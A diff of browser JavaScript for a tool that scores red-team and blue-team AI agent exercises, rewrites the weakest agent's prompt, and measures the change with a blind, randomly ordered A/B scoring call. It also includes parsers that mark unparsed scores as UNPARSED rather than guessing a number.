+    `## RE-RUN OUTPUT — SELF-GRADE, NOT THE MEASUREMENT`, ``,
+    `The section below is the phase that wrote the revised stage output AND scored it AND issued its own verdict on it. The blind paired score above is the measurement.`, ``,
+    (rerunOutput || '(no re-run output)').trim()
+  ].join('\n');
+  const fn = `${fnBase}-${Date.now()}.md`;
+  const b = new Blob([pkg], { type: 'text/markdown;charset=utf-8' });
+  const u = URL.createObjectURL(b);
+  const a = document.createElement('a');
+  a.href = u; a.download = fn; a.click(); URL.revokeObjectURL(u);
+  const btn = document.getElementById('export-dl-btn');
+  if (btn) {
+    const orig = btn.textContent;
+    btn.textContent = '[ ⬇ DOWNLOADED ✓ ]';
+    btn.classList.add('done');
+    setTimeout(() => { btn.textContent = orig; btn.classList.remove('done'); }, 2000);
+  }
+}
+
+// ─── Mode select ───
+function selectMode(mode) {
+  evolveMode = mode;
+  setPhase(1);
+
+  document.getElementById('intake-preset').style.display = 'none';
+  document.getElementById('intake-custom').style.display = 'none';
+  document.getElementById('intake-import').style.display = 'none';
+
+  if (mode === 'preset') {
+    document.getElementById('intake-preset').style.display = 'flex';
+    renderPresetAgents();
+    document.getElementById('binfo').textContent = 'Select swarm type, then click BEGIN EVALUATION.';
+  } else if (mode === 'custom') {
+    document.getElementById('intake-custom').style.display = 'flex';
+    if (demoMode) populateCustomDemoFields();
+    document.getElementById('binfo').textContent = 'Describe your swarm and add agent prompts, then click DESIGN CHALLENGE.';
+  } else if (mode === 'import') {
+    importData = loadEvolveSource();
+    renderChainImport(importData);
+    document.getElementById('intake-import').style.display = 'flex';
+    document.getElementById('binfo').textContent = 'Review imported exercise, then click BEGIN ANALYSIS.';
+  }
+
+  document.getElementById('run-btn').disabled = false;
+}
+
+function setPreset(p) {
+  evolvePreset = p;
+  document.getElementById('preset-red-btn').className = 'swtb' + (p === 'red' ? ' sel-red' : '');
+  document.getElementById('preset-blue-btn').className = 'swtb' + (p === 'blue' ? ' sel-blue' : '');
+  renderPresetAgents();
+}
+
+function renderPresetAgents() {
+  const list = document.getElementById('preset-agent-list');
+  list.innerHTML = '';
+  PRESET_AGENTS[evolvePreset].forEach(a => {
+    const d = document.createElement('div');
+    d.className = 'agent-card';
+    d.innerHTML = `<span class="agent-name">${a.name}</span><span class="agent-role">${a.role}</span>`;
+    list.appendChild(d);
+  });
+}
+
+function renderChainImport(data) {
+  if (!data) {
+    document.getElementById('imported-exercise-card').innerHTML = '<div style="color:var(--red);font-size:11px">No exercise data found in localStorage. Run the Combat Demo first, then return here.</div>';
+    return;
+  }
+  document.getElementById('import-ex-name').textContent = 'EXERCISE IMPORTED: ' + (data.exercise_name || 'UNKNOWN');
+  const scores = document.getElementById('import-scores');
+  scores.innerHTML = `<span class="score-badge red">RED ${data.red_score || '?'}/10</span><span class="score-badge blue">BLUE ${data.blue_score || '?'}/10</span>`;
+  const tbody = document.getElementById('import-table-body');
+  tbody.innerHTML = '';
+  data.stage_results.forEach(s => {
+    const ro = s.red_outcome || 'PASS';
+    const bo = s.blue_outcome || 'PARTIAL';
+    const rc = ro === 'PASS' ? 'outcome-pass' : ro === 'FAIL' ? 'outcome-fail' : 'outcome-partial';
+    const bc = bo === 'PASS' ? 'outcome-pass' : bo === 'FAIL' ? 'outcome-fail' : 'outcome-partial';
+    tbody.innerHTML += `<tr><td>${s.stage}</td><td class="${rc}">${ro}</td><td class="${bc}">${bo}</td></tr>`;
+  });
+  if (data.blue_agents) {
+    document.getElementById('import-agents-list').textContent = 'BLUE TEAM AGENTS: ' + data.blue_agents.map(a => a.name).join(', ');
+  }
+}
+
+function toggleSlot(n) {
+  const body = document.getElementById(`slot-${n}-body`);
+  const arrow = document.getElementById(`slot-${n}-arrow`);
+  body.classList.toggle('hidden');
+  arrow.textContent = body.classList.contains('hidden') ? '▶' : '▼';
+}
+
+function beginExercise() {
+  runImprovementCycle();
+}
+
+// ─── Agent prompt lookup ───
+function getAgentPrompt(name) {
+  if (AGENT_PROMPTS[name]) return AGENT_PROMPTS[name];
+  // Check custom fields
+  for (let i = 1; i <= 3; i++) {
+    const n = document.getElementById(`a${i}-name`)?.value.trim();
+    if (n && n.toUpperCase() === name.toUpperCase()) {
+      return document.getElementById(`a${i}-prompt`)?.value.trim() || '[prompt not provided]';
+    }
+  }
+  return '[agent prompt not found — using weakest agent name only]';
+}
+
+// ─── Build prompts for API calls ───
+function buildArbiterPrompt() {
+  return `Analyze this exercise transcript and produce a scorecard:\n\n${exerciseTranscript}\n\nIdentify the weakest agent and provide root cause analysis.`;
+}
+
+function buildSculptorPrompt(agentName, originalPrompt, arbiterText) {
+  return `ARBITER DIAGNOSIS:\n${arbiterText}\n\nWEAKEST AGENT: ${agentName}\n\nORIGINAL SYSTEM PROMPT:\n${originalPrompt}\n\nRefine this prompt to address ARBITER's diagnosis.`;
+}
+
+function buildRerunPrompt(agentName, refined, transcript, before) {
+  const baseline = (before === null || before === undefined)
+    ? 'Original aggregate score: NOT PARSED from the scorecard'
+    : `Original aggregate score: ${before}/10`;
+  return `REFINED AGENT: ${agentName}\n\nREFINED SYSTEM PROMPT:\n${refined}\n\nORIGINAL EXERCISE TRANSCRIPT:\n${transcript}\n\n${baseline}\n\nSimulate the revised agent output for stages where ${agentName} was active.`;
+}
+
+function buildChallengerPrompt() {
+  const brief = document.getElementById('custom-brief')?.value.trim() || '';
+  let agentsText = '';
+  for (let i = 1; i <= 3; i++) {
+    const n = document.getElementById(`a${i}-name`)?.value.trim();
+    const p = document.getElementById(`a${i}-prompt`)?.value.trim();
+    if (n) agentsText += `\n\nAGENT ${i}: ${n}\nPROMPT:\n${p || '[no prompt provided]'}`;
+  }
+  return `SWARM BRIEF:\n${brief}\n\nAGENT PROMPTS:${agentsText}\n\nDesign a challenge that stress-tests this swarm.`;
+}
+
+// ─── Parse helpers ───
+// W1 display helpers. An unparsed score renders as UNPARSED, never as a
+// number; a delta always carries its real sign.
+function isUnscored(n) { return n === null || n === undefined || isNaN(n); }
+function fmtScore(n) { return isUnscored(n) ? 'UNPARSED' : `${n}/10`; }
+function scoreBarPct(n) { return isUnscored(n) ? 0 : n * 10; }
+function fmtDelta(before, after) {
+  if (isUnscored(before) || isUnscored(after)) return 'UNPARSED';
+  const d = Math.round((after - before) * 100) / 100;
+  return d > 0 ? `+${d}` : `${d}`;
+}
+// W1: strip markdown emphasis before matching. The readers below previously
+// could not match `**Aggregate Score**` or `**IMPROVED**`, nor a fractional
+// score like `8.5/10` — which is why the manufactured fallbacks fired.
+// Asterisks and backticks never occur inside a score or a verdict token, so
+// removing them cannot manufacture a match that was not already in the text.
+function stripEmphasis(t) { return String(t).replace(/[*`]/g, ''); }
+
+// Clamp 0-10. Live runs saw the arbiter return >10/10
+// when CHALLENGER had fabricated the exercise from blank intake. Belt-and-
+// braces against any future model that ignores the schema.
+function clampScore(n) {
+  if (n == null || isNaN(n)) return n;
+  if (n > 10) { console.warn(`[evolve] score ${n}/10 exceeds max — clamping to 10`); return 10; }
+  if (n < 0)  { console.warn(`[evolve] score ${n}/10 below min — clamping to 0`); return 0; }
+  return n;
+}
+
+function parseArbiterOutput(text) {
+  const t = stripEmphasis(text);
+  const weakestMatch = t.match(/Weakest Agent:\s*([A-Z][A-Z0-9\-]+)/);
+  const weaknessMatch = t.match(/Weakness Class:\s*(detection_gap|evasion_failure|coordination_miss|scope_confusion|output_quality)/);
+  const aggregateMatch = t.match(/Aggregate Score:\s*(\d+(?:\.\d+)?)\s*\/\s*10/);
+  return {
+    weakestAgent: weakestMatch ? weakestMatch[1].trim() : null,
+    weaknessClass: weaknessMatch ? weaknessMatch[1] : null,
+    aggregate: aggregateMatch ? clampScore(parseFloat(aggregateMatch[1])) : null
+  };
+}
+
+function parseSculptorOutput(text) {
+  const promptStart = text.indexOf('---BEGIN REFINED PROMPT---');
+  const promptEnd = text.indexOf('---END REFINED PROMPT---');
+  const refined = promptStart >= 0 && promptEnd > promptStart
+    ? text.slice(promptStart + '---BEGIN REFINED PROMPT---'.length, promptEnd).trim()
+    : '';
+  const manifest = [];
+  const lines = text.split('\n');
+  for (const line of lines) {
+    const m = line.match(/^-\s*(ADDED|REMOVED|TIGHTENED|CLARIFIED):\s*(.+)/);
+    if (m) manifest.push({ type: m[1], text: m[2].trim() });
+  }
+  return { refined, manifest };
+}
+
+// W1: a failed parse is a REPORTED FAILURE, never a manufactured number or a
+// manufactured verdict. An unmeasured cycle stays visibly unmeasured (null /
+// 'UNPARSED') so no reader mistakes a fallback for a measurement.
+function parseRerunOutput(text) {
+  const t = stripEmphasis(text);
+  // The Aggregate Score label may carry a prefix or a parenthetical suffix,
+  // so anything up to the first pipe is tolerated — the row must still exist.
+  const deltaMatch = t.match(/Aggregate Score[^|\n]*\|\s*(\d+(?:\.\d+)?)\s*\/\s*10\s*\|\s*(\d+(?:\.\d+)?)\s*\/\s*10/);
+  const verdictMatch = t.match(/RERUN VERDICT:\s*(IMPROVED|MARGINAL|REGRESSION)/);
+  if (!deltaMatch) console.warn('[evolve] PARSE FAILURE: RERUN output has no `Aggregate Score | N/10 | N/10` row. score_after = UNPARSED (not estimated).');
+  if (!verdictMatch) console.warn('[evolve] PARSE FAILURE: RERUN output has no `RERUN VERDICT: IMPROVED|MARGINAL|REGRESSION` line. verdict = UNPARSED.');
+  return {
+    scoreBefore: deltaMatch ? clampScore(parseFloat(deltaMatch[1])) : scoreBefore,
+    scoreAfter: deltaMatch ? clampScore(parseFloat(deltaMatch[2])) : null,
+    verdict: verdictMatch ? verdictMatch[1] : 'UNPARSED'
+  };
+}
+
+// ─── W4: blind paired scoring, in the browser ───
+// The replay phase writes the revised stage output, scores it, and issues its
+// own verdict on it, so it cannot return a negative result about its own work.
+// This scores the original and the post-rewrite stage output in ONE separate
+// call, labelled only A and B, in an order drawn at random per run. One call
+// scores both so its own harshness is common-mode and cancels in the
+// difference. The assignment is recorded and displayed so a viewer can audit
+// the un-blinding. Ported from the capture harness; keep the two in step.
+
+function stageBlocksForAgent(transcript, agent) {
+  const placeholder = '[stage output withheld — this is the stage under test]';
+  const esc = agent.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+  const collect = (parts, isOwned, headFor) => {
+    const owned = [], ctx = [];
+    for (const part of parts) {
+      const body = part.trim();
+      if (!body) continue;
+      if (isOwned(body)) { owned.push(body); ctx.push(headFor(body) + '\n' + placeholder); }
+      else ctx.push(body);
+    }
+    return { owned: owned.length ? owned.join('\n\n') : null, context: ctx.join('\n\n') };
+  };
+  // Preset form: [RED — STAGE] / [BLUE — STAGE] blocks whose first content line
+  // names their author.
+  let parts = transcript.split(/\n(?=\[(?:RED|BLUE) — )/);
+  if (parts.length > 1) {
+    const firstLineAuthor = new RegExp('^\\**' + esc + '\\**\\s*[—-]');
+    return collect(parts,
+      body => {
+        const nl = body.indexOf('\n');
+        const rest = nl < 0 ? '' : body.slice(nl + 1).trim();
+        return rest ? firstLineAuthor.test(rest.split('\n')[0].trim()) : false;
+      },
+      body => { const nl = body.indexOf('\n'); return nl < 0 ? body : body.slice(0, nl); });
+  }
+  // Custom form: **AGENT-NAME — stage** headers.
+  parts = transcript.split(/\n(?=\*\*[A-Z][A-Z0-9\- ]*[—-])/);
+  const ownedRe = new RegExp('^\\*\\*' + esc + '\\b');
+  return collect(parts, body => ownedRe.test(body), () => '**' + agent + ' — stage**');
+}
+
+function revisedStageOutput(rerunText) {
+  if (!rerunText) return null;
+  const endM = rerunText.match(/\n#+\s*\**\s*Performance Delta/);
+  const end = endM ? endM.index : rerunText.length;
+  const head = rerunText.slice(0, end);
+  let m = head.match(/\n#+[^\n]*Replaying exercise[^\n]*\n/);
+  let start;
+  if (m) { start = m.index + m[0].length; }
+  else {
+    m = head.match(/\n\*\*[A-Z][A-Z0-9\-]+\**\s*[—-]/);
+    if (!m) return null;
+    start = m.index;
+  }
+  const body = head.slice(start).trim();
+  return body || null;
+}
+
+// Wording whose presence would tell the scorer which side it is looking at.
+// The scrubber removes what can be removed without mangling content; this
+// reports whatever survives. It is a REPORT, not a gate — a contaminated run is
+// shown as contaminated, never silently dropped.
+const BLIND_LEAK_RE = [
+  /\bREVISED\b/, /\brevised\b/, /\brefined\b/, /\brefinement\b/,
+  /\bSCULPTOR\b/, /\bARBITER\b/, /\bRERUN\b/,
+  /\brewritten\b/, /\brewrite\b/, /\bcorrected\b/, /\bimproved\b/,
+  /\bthe original\b/, /\boriginal (?:rule|version|prompt|agent|output)\b/,
+  /\bpreviously\b/, /\bno longer\b/, /\bcompared to\b/, /\bunlike the\b/,
+  /\bREJECTED\b/, /\bwas missing\b/, /\bnow (?:correctly|includes|fires|escalates)\b/
+];
+function detectBlindingLeaks(t) {
+  const out = [];
+  for (const re of BLIND_LEAK_RE) { const m = t.match(re); if (m && out.indexOf(m[0]) < 0) out.push(m[0]); }
+  return out;
+}
+
+// Outcome markers are emitted by the replay phase and never by the fixed
+// exercise transcript, so their mere presence identifies that side.
+function scrubBlindingMarkers(t) {
+  return String(t).split('\n')
+    .filter(l => !/^\s*\[Outcome:/.test(l))
+    .map(l => l.replace(/\s+REVISED\s*(?=[—-])/, ' ').replace(/\bREVISED\b/g, ''))
+    .join('\n').replace(/\n{3,}/g, '\n\n').trim();
+}
+
+function readBlindScores(text) {
+  const t = stripEmphasis(text);
+  const a = t.match(/TRANSCRIPT A AGGREGATE:\s*(\d+(?:\.\d+)?)\s*\/\s*10/);
+  const b = t.match(/TRANSCRIPT B AGGREGATE:\s*(\d+(?:\.\d+)?)\s*\/\s*10/);
+  const c = t.match(/COMPARISON:\s*(A_HIGHER|B_HIGHER|EQUIVALENT)/);
+  if (!a || !b) console.warn('[evolve] PARSE FAILURE: blind scorer output is missing a `TRANSCRIPT A/B AGGREGATE: N/10` line. Blind score = UNPARSED (not estimated).');
+  if (!c) console.warn('[evolve] PARSE FAILURE: blind scorer output has no `COMPARISON: A_HIGHER|B_HIGHER|EQUIVALENT` line. Blind comparison = UNPARSED.');
+  return {
+    a: a ? clampScore(parseFloat(a[1])) : null,
+    b: b ? clampScore(parseFloat(b[1])) : null,
+    comparison: c ? c[1] : null
+  };
+}
+
+function coinFlipLetter() {
+  try {
+    const buf = new Uint8Array(1);
+    (self.crypto || window.crypto).getRandomValues(buf);
+    return (buf[0] & 1) ? 'A' : 'B';
+  } catch (_) { return Math.random() < 0.5 ? 'A' : 'B'; }
+}
+
+async function runBlindPairedScore(ak) {
+  const pair = stageBlocksForAgent(exerciseTranscript, weakestAgentName);
+  const revised = revisedStageOutput(rerunOutput);
+  if (!pair.owned) {
+    console.warn(`[evolve] BLIND NOT RUN: no stage output authored by ${weakestAgentName} in the exercise transcript, so there is nothing to pair against. No number substituted.`);
+    return { notRun: `no stage output authored by ${weakestAgentName} exists in this exercise, so there was nothing to pair against` };
+  }
+  if (!revised) {
+    console.warn('[evolve] BLIND NOT RUN: could not locate the replay stage output ahead of its delta table. No number substituted.');
+    return { notRun: 'could not locate the replay stage output ahead of its delta table' };
+  }
+  const originalS = scrubBlindingMarkers(pair.owned);
+  const revisedS = scrubBlindingMarkers(revised);
+  const revisedLetter = coinFlipLetter();
+  const originalLetter = revisedLetter === 'A' ? 'B' : 'A';
+  const aText = revisedLetter === 'A' ? revisedS : originalS;
+  const bText = revisedLetter === 'A' ? originalS : revisedS;
+  const leaks = detectBlindingLeaks(revisedS).concat(detectBlindingLeaks(originalS));
+  if (leaks.length) console.warn('[evolve] BLINDING LEAK: wording that could identify a side survived the scrub: ' + leaks.join(', '));
+  console.info(`[evolve] blind assignment — post-rewrite output presented as TRANSCRIPT ${revisedLetter}, original as TRANSCRIPT ${originalLetter}`);
+
+  const user = 'SHARED EXERCISE CONTEXT — the stage under test has been withheld from '
+    + 'this context, so it is identical for both transcripts and tells you nothing '
+    + 'about either:\n\n' + pair.context
+    + '\n\n=== TRANSCRIPT A ===\n' + aText
+    + '\n\n=== TRANSCRIPT B ===\n' + bText
+    + '\n\nScore TRANSCRIPT A and TRANSCRIPT B independently against one shared '
+    + 'rubric, following your output format exactly.';
+
+  const out = await callWithRecovery('BLIND SCORER',
+    opts => evolveCallAPI(SYS_BLIND, budget(user, 2000), ak, opts), null);
+  const sc = readBlindScores(out);
+  const revisedScore = revisedLetter === 'A' ? sc.a : sc.b;
+  const originalScore = revisedLetter === 'A' ? sc.b : sc.a;
+  let unblinded = null;
+  if (sc.comparison === 'EQUIVALENT') unblinded = 'EQUIVALENT';
+  else if (sc.comparison) unblinded = (sc.comparison[0] === revisedLetter) ? 'POST-REWRITE HIGHER' : 'ORIGINAL HIGHER';
+  return {
+    revisedLetter, originalLetter, scoreA: sc.a, scoreB: sc.b,
+    originalScore, revisedScore, comparison: sc.comparison, unblinded,
+    leaks, output: out
+  };
+}
+
+function renderBlindBox(b) {
+  const el = document.getElementById('blind-box');
+  if (!el) return;
+  const hdr = '<div class="blind-hdr">⚛ BLIND PAIRED SCORE — THE MEASUREMENT</div>';
+  if (!b) {
+    el.innerHTML = hdr + '<div class="blind-note">Not run in recorded mode — this measurement requires a live scoring call. No number has been substituted for it.</div>';
+    return;
+  }
+  if (b.notRun) {
+    el.innerHTML = hdr + `<div class="blind-note">NOT RUN — ${b.notRun}. No number has been substituted.</div>`;
+    return;
+  }
+  const measured = !isUnscored(b.originalScore) && !isUnscored(b.revisedScore);
+  const dir = measured ? b.revisedScore - b.originalScore : null;
+  const cls = !measured ? 'blind-unp' : dir > 0 ? 'blind-hi' : dir < 0 ? 'blind-lo' : 'blind-eq';
+  el.innerHTML = hdr
+    + '<div class="blind-note">Both stage outputs were scored by one separate call, labelled only A and B, in an order drawn at random for this run. That call was told nothing about which was which, and the context it saw had this stage withheld.</div>'
+    + `<div class="blind-row"><span class="blind-k">Randomized assignment</span><span class="blind-v">post-rewrite = TRANSCRIPT ${b.revisedLetter} · original = TRANSCRIPT ${b.originalLetter}</span></div>`
+    + `<div class="blind-row"><span class="blind-k">TRANSCRIPT A / B</span><span class="blind-v">${fmtScore(b.scoreA)} / ${fmtScore(b.scoreB)}</span></div>`
+    + `<div class="blind-row"><span class="blind-k">Un-blinded</span><span class="blind-v">original ${fmtScore(b.originalScore)} → post-rewrite ${fmtScore(b.revisedScore)}</span></div>`
+    + `<div class="blind-row"><span class="blind-k">Paired delta</span><span class="blind-v ${cls}">${fmtDelta(b.originalScore, b.revisedScore)}</span></div>`
+    + `<div class="blind-row"><span class="blind-k">Comparison</span><span class="blind-v ${cls}">${b.comparison || 'UNPARSED'}${b.unblinded ? ' → ' + b.unblinded : ''}</span></div>`
+    + (b.leaks && b.leaks.length
+        ? `<div class="blind-warn">BLINDING LEAK — wording that could identify a side survived the scrub: ${b.leaks.map(x => '"' + x + '"').join(', ')}. This run's blind is not clean.</div>`
+        : '');
+}
+
+// ─── Typewriter ───
+async function twEl(el, txt) {
+  el.textContent = ''; let i = 0;
+  return new Promise(r => {
+    function tk() {
+      if (i < txt.length) {
+        el.textContent += txt.slice(i, i + 6); i += 6;
+        el.closest('.terminal, .arbiter-wrap, .rerun-pane')?.scrollTo(0, 1e9);
+        setTimeout(tk, 18);
+      } else { el.textContent = txt; r(); }
+    } tk();
+  });
+}
+// Streaming-aware typewriter — paints text from `ref.current` as deltas
+// arrive. Resolves when ref.done is true and rendered text caught up.
+// LIVE+CC path only; DEMO/non-CC LIVE paths stay on twEl with full content.
+async function twElStream(el, ref) {
+  el.textContent = '';
+  return new Promise(r => {
+    function tk() {
+      const tgt = ref.current || '';
+      const have = el.textContent.length;
+      if (tgt.length > have) {
+        const next = Math.min(tgt.length, have + 16);
+        el.textContent = tgt.slice(0, next);
+        el.closest('.terminal, .arbiter-wrap, .rerun-pane')?.scrollTo(0, 1e9);
+        setTimeout(tk, 18);
+      } else if (ref.done) {
+        el.textContent = tgt;
+        el.closest('.terminal, .arbiter-wrap, .rerun-pane')?.scrollTo(0, 1e9);
+        r();
+      } else {
+        setTimeout(tk, 30);
+      }
+    }
+    tk();
+  });
+}
+let tokTotal = 0;
+function tokEl() { return document.getElementById('tok-count'); }
+function resetTokens() { tokTotal = 0; const e = tokEl(); if (!e) return; e.textContent = 'tokens: 0 ▌'; e.style.display = 'inline-block'; }
+function bumpTokens(chunk) {
+  tokTotal += Math.max(1, Math.round((chunk || '').length / 4));
+  const e = tokEl(); if (!e) return; e.textContent = `tokens: ${tokTotal} ▌`;
+}
+function hideTokens() { const e = tokEl(); if (e) e.style.display = 'none'; }
+function flashStallWarning(msg) {
+  const e = tokEl(); if (!e) return;
+  e.textContent = `⚠ ${msg}`;
+  e.style.borderColor = 'var(--amb)'; e.style.color = 'var(--amb)';
+  e.style.display = 'inline-block';
+}
+function clearStallWarning() {
+  const e = tokEl(); if (!e) return;
+  e.style.borderColor = ''; e.style.color = '';
+}
+// Append a per-phase output budget to the user prompt — caps wall-clock
+// scaling for the worst-offender stages without hurting completion quality.
+function budget(user, tokens) {
+  return user + `\n\nTarget length: ${tokens} tokens. Use tables and bullets where possible. Be precise, not exhaustive.`;
+}
+// Fetch a phase's full text. In LIVE+CC, streams via SSE and paints into
+// `streamEl` as tokens arrive (caller is responsible for revealing/clearing
+// the streaming target). In DEMO MODE the caller passes a `demoFetch`
+// callback (returns the canned text); in LIVE non-CC, falls through to
+// evolveCallAPI(). Returns the canonical full text.
+async function streamPhaseText(streamEl, sys, user, ak, demoFetch, opts) {
+  if (demoMode) {
+    const txt = await demoFetch();
+    if (streamEl) await twEl(streamEl, txt);
+    return txt;
+  }
+  if (evolveProvider === 'cc' && streamEl) {
+    const ref = { current: '', done: false };
+    resetTokens();
+    const render = twElStream(streamEl, ref);
+    let res;
+    try { res = await callClaudeCode(sys, user, c => { ref.current += c; bumpTokens(c); }, opts); }
+    catch (e) { ref.done = true; try { await render; } catch (_) {} throw e; }
+    ref.current = res; ref.done = true;
+    await render;
+    return res;
+  }
+  const res = await evolveCallAPI(sys, user, ak);
+  if (streamEl) await twEl(streamEl, res);
+  return res;
+}
+// Per-phase recovery wrapper for evolve.
+const LOOP_DEFAULT_TIMEOUT = 600;
+async function callWithRecovery(label, fn, el) {
+  const opts = { timeoutSec: 0 };
+  while (true) {
+    try { return await fn(opts); }
+    catch (e) {
+      const choice = await showEvolvePhaseRecovery(label, e.message, e);
+      if (choice === 'continue') { opts.timeoutSec = (opts.timeoutSec || LOOP_DEFAULT_TIMEOUT) + 60; }
+      else if (choice === 'retry') { opts.timeoutSec = 0; }
+      else if (choice === 'skip') {
+        const marker = `[${label} skipped by operator — ${(e.failureClass || 'unknown').toUpperCase()} failure: ${e.message}]`;
+        if (el) el.textContent = marker;
+        return marker;
+      }
+      else if (choice === 'demo') { if (!demoMode) toggleDemo(); opts.timeoutSec = 0; }
+      else { throw e; }
+    }
+  }
+}
+function showEvolvePhaseRecovery(label, msg, err) {
+  return new Promise(resolve => {
+    const banner = document.createElement('div');
+    banner.className = 'phase-recovery';
+    banner.innerHTML = `
+      <div class="phase-recovery-hdr">⚠ ${label} — phase recovery</div>
+      ${failureBanner(err)}
+      <div class="phase-recovery-msg">${safeErrText((msg || '').slice(0, 200))}</div>
+      <div class="phase-recovery-sub">Retry, wait longer, switch to the recorded run, or abort.</div>
+      <div class="phase-recovery-btns">
+        <button class="prv-cont" data-c="continue">[ ⏳ Continue waiting (+60s) ]</button>
+        <button class="prv-retry" data-c="retry">[ ↻ Retry phase ]</button>
+        <button class="prv-skip" data-c="skip">[ ⏭ Skip phase ]</button>
+        <button class="prv-demo" data-c="demo">[ ◉ Switch to DEMO ]</button>
+        <button class="prv-dismiss" data-c="dismiss">[ ✕ Abort run ]</button>
+      </div>`;
+    banner.querySelectorAll('button').forEach(b => {
+      b.onclick = () => { banner.remove(); resolve(b.dataset.c); };
+    });
+    // Append into the active phase panel for visibility — evolve uses
+    // `.phase-panel.active` to drive the show/hide CSS rule.
+    const host = document.querySelector('.phase-panel.active') || document.body;
+    host.appendChild(banner);
+    banner.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  });
+}
+
+async function twAppend(container, txt, cls) {
+  const d = document.createElement('div');
+  d.className = 'te';
+  const body = document.createElement('div');
+  body.className = `te-body ${cls || 'amber'}`;
+  d.appendChild(body);
+  container.appendChild(d);
+  await twEl(body, txt);
+  container.scrollTop = 1e9;
+}
+
+// ─── Phase animations ───
+
+async function animatePresetExercise() {
+  const wrap = document.getElementById('exercise-wrap');
+  wrap.innerHTML = '';
+
+  const rKey = evolvePreset === 'red' ? 'red' : 'blue';
+
+  // Build split terminal layout
+  wrap.innerHTML = `
+    <div class="ex-split" style="flex:1;min-height:0">
+      <div class="ex-pane">
+        <div class="ex-ptb"><span class="ex-ptitle red">RED TEAM — OFFENSIVE OPS</span></div>
+        <div class="terminal red" id="ex-red-term"></div>
+      </div>
+      <div class="ex-div"></div>
+      <div class="ex-pane">
+        <div class="ex-ptb"><span class="ex-ptitle blue">BLUE TEAM — SOC OPERATIONS</span></div>
+        <div class="terminal blue" id="ex-blue-term"></div>
+      </div>
+    </div>`;
+
+  const rTerm = document.getElementById('ex-red-term');
+  const bTerm = document.getElementById('ex-blue-term');
+
+  const stages = [
+    { rKey: 'de-r-recon', bKey: 'de-b-monitor', rLabel: 'RECON', bLabel: 'MONITOR' },
+    { rKey: 'de-r-access', bKey: 'de-b-detect', rLabel: 'INITIAL ACCESS', bLabel: 'DETECT' },
+    { rKey: 'de-r-persist', bKey: 'de-b-investigate', rLabel: 'PERSISTENCE', bLabel: 'INVESTIGATE' },
+  ];
+
+  exerciseTranscript = '';
+  for (const st of stages) {
+    // The exercise is fixed scenario data (the same red/blue stage transcript) in both modes;
+    // LIVE MODE's role here is to drive ARBITER/SCULPTOR/RERUN against this transcript via the API,
+    // not to regenerate the underlying exercise. Pull from the DEMO script blocks unconditionally.
+    const rContent = gx(st.rKey) || `[${st.rLabel} stage transcript missing — check demo content]`;
+    const bContent = gx(st.bKey) || `[${st.bLabel} stage transcript missing — check demo content]`;
+
+    // Red
+    const rHdr = document.createElement('div');
+    rHdr.className = 'te-hdr red';
+    rHdr.textContent = `▶ ${st.rLabel}`;
+    const rBody = document.createElement('div');
+    rBody.className = 'te-body red';
+    rTerm.appendChild(rHdr); rTerm.appendChild(rBody);
+    await twEl(rBody, rContent);
+    exerciseTranscript += `\n\n[RED — ${st.rLabel}]\n${rContent}`;
+
+    await new Promise(r => setTimeout(r, 300));
+
+    // Blue
+    const bHdr = document.createElement('div');
+    bHdr.className = 'te-hdr blue';
+    bHdr.textContent = `⚡ ${st.bLabel}`;
+    const bBody = document.createElement('div');
+    bBody.className = 'te-body blue';
+    bTerm.appendChild(bHdr); bTerm.appendChild(bBody);
+    await twEl(bBody, bContent);
+    exerciseTranscript += `\n\n[BLUE — ${st.bLabel}]\n${bContent}`;
+
+    await new Promise(r => setTimeout(r, 500));
+  }
+}
+
+async function animateCustomExercise(text) {
+  const wrap = document.getElementById('exercise-wrap');
+  wrap.innerHTML = `
+    <div style="flex:1;display:flex;flex-direction:column;overflow:hidden;min-height:0">
+      <div class="ex-ptb"><span class="ex-ptitle amber">CHALLENGER — DESIGNING CHALLENGE</span></div>
+      <div class="terminal single" id="ex-custom-term"></div>
+    </div>`;
+  const term = document.getElementById('ex-custom-term');
+  const body = document.createElement('div');
+  body.className = 'te-body amber';
+  term.appendChild(body);
+  await twEl(body, text);
+  exerciseTranscript = text;
+}
+
+async function animateChainedExercise() {
+  const wrap = document.getElementById('exercise-wrap');
+  const transcript = importData?.blue_transcript_excerpt || '[No transcript data in imported exercise]';
+  wrap.innerHTML = `
+    <div style="flex:1;display:flex;flex-direction:column;overflow:hidden;min-height:0">
+      <div class="ex-ptb"><span class="ex-ptitle blue">IMPORTED EXERCISE — BLUE TEAM TRANSCRIPT</span></div>
+      <div class="terminal single" id="ex-import-term"></div>
+    </div>`;
+  const term = document.getElementById('ex-import-term');
+  const body = document.createElement('div');
+  body.className = 'te-body blue';
+  term.appendChild(body);
+  await twEl(body, transcript);
+  exerciseTranscript = transcript + '\n\nRed Score: ' + (importData?.red_score || '?') + '/10\nBlue Score: ' + (importData?.blue_score || '?') + '/10';
+}
+
+async function animateArbiter(text) {
+  // text is already final canonical content (streaming, if any, was painted
+  // into arbiter-content during fetch via streamArbiter). If the pane is
+  // empty we still need to render — handles the case where the caller passed
+  // pre-fetched text without streaming first.
+  const content = document.getElementById('arbiter-content');
+  if (!content.textContent || content.textContent.length < text.length) {
+    content.textContent = '';
+    await twEl(content, text);
+  }
+  const parsed = parseArbiterOutput(text);
+  if (parsed.aggregate) {
+    const scoreEl = document.createElement('div');
+    scoreEl.className = 'aggregate-score';
+    scoreEl.textContent = `AGGREGATE: ${parsed.aggregate}/10`;
+    document.getElementById('arbiter-wrap').appendChild(scoreEl);
+  }
+  if (parsed.weakestAgent) {
+    const weakEl = document.createElement('div');
+    weakEl.className = 'weakest-box';
+    weakEl.innerHTML = `<div class="weakest-label">WEAKEST AGENT IDENTIFIED</div><div style="font-family:'Orbitron',sans-serif;font-size:14px;color:var(--red)">${parsed.weakestAgent}</div>`;
+    document.getElementById('arbiter-wrap').appendChild(weakEl);
+  }
+}
+
+function diffLines(original, refined) {
+  const origLines = original.split('\n');
+  const refLines = refined.split('\n');
+  const origSet = new Set(origLines.map(l => l.trim()).filter(l => l));
+  const refSet = new Set(refLines.map(l => l.trim()).filter(l => l));
+  return {
+    origAnnotated: origLines.map(l => ({ text: l, removed: !refSet.has(l.trim()) && l.trim() !== '' })),
+    refAnnotated: refLines.map(l => ({ text: l, added: !origSet.has(l.trim()) && l.trim() !== '' }))
+  };
+}
+
+async function animateSculptor(original, refined, manifest) {
+  document.getElementById('before-hdr').textContent = `BEFORE: ${weakestAgentName} v${cycleNum}`;
